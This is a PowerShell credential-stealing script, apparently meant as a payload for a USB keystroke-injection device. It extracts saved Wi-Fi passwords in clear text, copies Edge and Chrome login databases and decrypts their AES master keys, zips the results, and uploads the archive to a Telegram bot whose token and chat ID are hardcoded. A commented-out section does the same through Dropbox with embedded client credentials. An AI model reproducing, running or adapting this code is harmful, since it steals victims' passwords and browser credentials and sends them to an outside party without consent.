# $DRIVE = 'CURCUITPY'

# $duckletter = Get-WmiObject -Class Win32_Volume | Where-Object { $_.Label -eq $DRIVE } | Select-Object -ExpandProperty Name


# $destinationDir = "$duckletter\$env:USERNAME"

$TempPath = [System.IO.Path]::GetTempPath()
$FolderName = "$env:USERNAME-Hellow/hi"
$destinationDir = Join-Path -Path $TempPath -ChildPath $FolderName

Add-Type -AssemblyName System.Security


# Create the destination directory if it doesn't exist
if (-not (Test-Path -Path $destinationDir)) {
    New-Item -ItemType Directory -Path $destinationDir | Out-Null
}

function GetWifiPasswords {
    $wifiProfiles = netsh wlan show profiles | Select-String "\s:\s(.*)$" | ForEach-Object { $_.Matches[0].Groups[1].Value }

    $results = @()

    foreach ($profile in $wifiProfiles) {
        $profileDetails = netsh wlan show profile name="$profile" key=clear
        $keyContent = ($profileDetails | Select-String "Key Content\s+:\s+(.*)$").Matches.Groups[1].Value
        $results += [PSCustomObject]@{
            ProfileName = $profile
            KeyContent  = $keyContent
        }
    }

    $results | Format-Table -AutoSize

    # Save results to a file
    $results | Out-File -FilePath "$destinationDir\WiFi_Details.txt"
}

GetWifiPasswords

# Function to copy Login Data file
function Copy-LoginData {
    param (
        [string]$browserName,
        [string]$browserDataPath
    )

    $browserDir = Join-Path -Path $destinationDir -ChildPath $browserName
    if (-not (Test-Path -Path $browserDir)) {
        New-Item -ItemType Directory -Path $browserDir | Out-Null
    }

    # Copy Login Data file
    $loginDataPath = Join-Path -Path $browserDataPath -ChildPath "Default\Login Data"
    if (Test-Path -Path $loginDataPath) {
        Copy-Item -Path $loginDataPath -Destination $browserDir -Force
        Write-Output "$browserName Copied Login Data to $browserDir"
    } else {
        Write-Output "$browserName Login Data file not found."
    }
}

# Function to decrypt AES key from Local State
function Get-DecryptedAESKey {
    param (
        [string]$browserName,
        [string]$localStatePath
    )

    $browserDir = Join-Path -Path $destinationDir -ChildPath $browserName
    if (-not (Test-Path -Path $browserDir)) {
        New-Item -ItemType Directory -Path $browserDir | Out-Null
    }

    # Read and parse the Local State file
    $localStateContent = Get-Content -Path $localStatePath -Raw | ConvertFrom-Json

    # Extract and decode the encrypted key
    $encryptedKey = $localStateContent.os_crypt.encrypted_key
    $encryptedKeyBytes = [System.Convert]::FromBase64String($encryptedKey)

    # Remove the first 5 bytes (DPAPI prefix) and decrypt the key
    $decryptedKey = [System.Security.Cryptography.ProtectedData]::Unprotect(
        $encryptedKeyBytes[5..($encryptedKeyBytes.Length - 1)],
        $null,
        [System.Security.Cryptography.DataProtectionScope]::CurrentUser
    )

    # Convert the decrypted key to Base64 and save it to a file
    $decryptedKeyBase64 = [System.Convert]::ToBase64String($decryptedKey)
    $outputPathAES = Join-Path -Path $browserDir -ChildPath "AES.txt"
    Set-Content -Path $outputPathAES -Value $decryptedKeyBase64

    Write-Output "$browserName Decrypted AES Key saved to $outputPathAES"
    Write-Output "$browserName Decrypted AES Key: $decryptedKeyBase64"
}

# Process Microsoft Edge
$edgeDataPath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
$edgeLocalStatePath = Join-Path -Path $edgeDataPath -ChildPath "Local State"

Copy-LoginData -browserName "Edge" -browserDataPath $edgeDataPath
Get-DecryptedAESKey -browserName "Edge" -localStatePath $edgeLocalStatePath

# Process Google Chrome
$chromeDataPath = "$env:LOCALAPPDATA\Google\Chrome\User Data"
$chromeLocalStatePath = Join-Path -Path $chromeDataPath -ChildPath "Local State"

Copy-LoginData -browserName "Chrome" -browserDataPath $chromeDataPath
Get-DecryptedAESKey -browserName "Chrome" -localStatePath $chromeLocalStatePath

Write-Output "All files and keys saved to: $destinationDir"

$currentDate = Get-Date -Format "yyyy-MM-dd"
$currentTime = Get-Date -Format "HH-mm-ss"
$TargetFileName = "$env:USERNAME-$currentDate-$currentTime.zip"

$FolderName2 = "$env:USERNAME-Hellow/$TargetFileName"
$destinationZip = Join-Path -Path $TempPath -ChildPath $FolderName2
Compress-Archive -Path $destinationDir -DestinationPath $destinationZip

# function UploadZipToDropbox {
#     param (
#         [string]$SourceFilePath,
#         [string]$TargetFilePath,
#         [string]$AccessToken
#     )

#     $url = "https://content.dropboxapi.com/2/files/upload"
#     $headers = @{
#         "Authorization" = "Bearer $AccessToken"
#         "Dropbox-API-Arg" = (@{
#             path = $TargetFilePath
#             mode = "add"
#             autorename = $true
#             mute = $false
#         } | ConvertTo-Json -Depth 10 -Compress)
#         "Content-Type" = "application/octet-stream"
#     }
    

#     Invoke-RestMethod -Uri $url -Method Post -Headers $headers -InFile $SourceFilePath
# }

# # Example usage:
# $client_id = "rtvd8jblu40nw3f"
# $client_secret = "xok1v7mz7bru3tk"
# $refresh_token = "YOUR_REFRESH_TOKEN"

# $refresh_url = "https://api.dropboxapi.com/oauth2/token"
# $refresh_body = @{
#     grant_type    = "refresh_token"
#     refresh_token = $refresh_token
#     client_id     = $client_id
#     client_secret = $client_secret
# }

# $response = Invoke-RestMethod -Method Post -Uri $refresh_url -Body $refresh_body
# $AccessToken = $response.access_token

# UploadZipToDropbox -SourceFilePath $destinationZip -TargetFilePath $TargetFilePath -AccessToken $AccessToken

$botToken = "7668975086:AAEOkGwuPNFYCZy9ij3nHcUuuJoMHfWpss4"
$chatID = "1019903018"
$uri = "https://api.telegram.org/bot$botToken/sendDocument"
$FileContent = [System.IO.File]::ReadAllBytes($destinationZip)
$form = @{
    chat_id = $chatID
    document = $FileContent
}

# Reading the file content
# $Base64FileContent = [System.Convert]::ToBase64String($FileContent)

# $multipartFormData = @{}
# foreach ($key in $parameters.Keys) {
#     $multipartFormData += @{"$key" = $parameters.$key}
# }

# # Adding the file as a form data part
# $multipartFormData['document'] = @{
#     content = $Base64FileContent
#     filename = [System.IO.Path]::GetFileName($FilePath)
# }

$form = @{}
$form.Add("chat_id", $chatID)
$form.Add("document", [System.IO.File]::ReadAllBytes($destinationZip))

# Create the boundary
$boundary = [System.Guid]::NewGuid().ToString()

# Build the multipart/form-data body
$body = "--$boundary`r`n"
$body += "Content-Disposition: form-data; name=`"chat_id`"`r`n`r`n$chatID`r`n"
$body += "--$boundary`r`n"
$body += "Content-Disposition: form-data; name=`"document`"; filename=`"$(Split-Path $destinationZip -Leaf)`"`r`n"
$body += "Content-Type: application/octet-stream`r`n`r`n"
$body += [System.Text.Encoding]::UTF8.GetString($form["document"]) + "`r`n"
$body += "--$boundary--`r`n"

# Convert the body to bytes
$bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($body)

# Create the request
$invokeRestMethodSplat = @{
    Uri         = $uri
    ErrorAction = 'Stop'
    Body        = $bodyBytes
    Method      = 'Post'
    Headers     = @{ "Content-Type" = "multipart/form-data; boundary=$boundary" }
}

Invoke-RestMethod @invokeRestMethodSplat

# Invoke-RestMethod -Uri $uri -Method Post -Form $parameters